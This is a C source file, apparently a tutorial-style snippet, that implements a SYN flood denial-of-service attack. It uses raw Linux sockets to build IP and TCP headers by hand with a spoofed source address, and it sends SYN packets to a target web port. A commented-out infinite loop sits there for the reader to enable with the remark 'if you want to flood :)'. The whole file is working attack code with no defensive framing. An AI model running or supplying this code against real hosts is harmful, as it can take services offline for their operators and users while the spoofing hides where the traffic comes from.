/*
	Syn Flood DOS with LINUX sockets
*/
#include&lt;stdio.h&gt;
#include&lt;string.h&gt; //memset
#include&lt;sys/socket.h&gt;
#include&lt;stdlib.h&gt; //for exit(0);
#include&lt;errno.h&gt; //For errno - the error number
#include&lt;netinet/tcp.h&gt;	//Provides declarations for tcp header
#include&lt;netinet/ip.h&gt;	//Provides declarations for ip header

struct pseudo_header    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	
	struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes&gt;1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&amp;oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum&gt;&gt;16)+(sum &amp; 0xffff);
	sum = sum + (sum&gt;&gt;16);
	answer=(short)~sum;
	
	return(answer);
}

int main (void)
{
	//Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	//Datagram to represent the packet
	char datagram[4096] , source_ip[32];
	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	strcpy(source_ip , &quot;192.168.1.2&quot;);
  
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	sin.sin_addr.s_addr = inet_addr (&quot;1.2.3.4&quot;);
	
	memset (datagram, 0, 4096);	/* zero out the buffer */
	
	//Fill in the IP Header
	iph-&gt;ihl = 5;
	iph-&gt;version = 4;
	iph-&gt;tos = 0;
	iph-&gt;tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph-&gt;id = htons(54321);	//Id of this packet
	iph-&gt;frag_off = 0;
	iph-&gt;ttl = 255;
	iph-&gt;protocol = IPPROTO_TCP;
	iph-&gt;check = 0;		//Set to 0 before calculating checksum
	iph-&gt;saddr = inet_addr ( source_ip );	//Spoof the source ip address
	iph-&gt;daddr = sin.sin_addr.s_addr;
	
	iph-&gt;check = csum ((unsigned short *) datagram, iph-&gt;tot_len &gt;&gt; 1);
	
	//TCP Header
	tcph-&gt;source = htons (1234);
	tcph-&gt;dest = htons (80);
	tcph-&gt;seq = 0;
	tcph-&gt;ack_seq = 0;
	tcph-&gt;doff = 5;		/* first and only tcp segment */
	tcph-&gt;fin=0;
	tcph-&gt;syn=1;
	tcph-&gt;rst=0;
	tcph-&gt;psh=0;
	tcph-&gt;ack=0;
	tcph-&gt;urg=0;
	tcph-&gt;window = htons (5840);	/* maximum allowed window size */
	tcph-&gt;check = 0;/* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
	tcph-&gt;urg_ptr = 0;
	//Now the IP checksum
	
	psh.source_address = inet_addr( source_ip );
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);
	
	memcpy(&amp;psh.tcp , tcph , sizeof (struct tcphdr));
	
	tcph-&gt;check = csum( (unsigned short*) &amp;psh , sizeof (struct pseudo_header));
	
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &amp;one;
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) &lt; 0)
	{
		printf (&quot;Error setting IP_HDRINCL. Error number : %d . Error message : %s \n&quot; , errno , strerror(errno));
		exit(0);
	}
	
	//Uncommend the loop if you want to flood :)
	//while (1)
	//{
		//Send the packet
		if (sendto (s,		/* our socket */
					datagram,	/* the buffer containing headers and data */
					iph-&gt;tot_len,	/* total length of our datagram */
					0,		/* routing flags, normally always 0 */
					(struct sockaddr *) &amp;sin,	/* socket addr, just like in */
					sizeof (sin)) &lt; 0)		/* a normal send() */
		{
			printf (&quot;error\n&quot;);
		}
		//Data send successfully
		else
		{
			printf (&quot;Packet Send \n&quot;);
		}
	//}
	
	return 0;
}
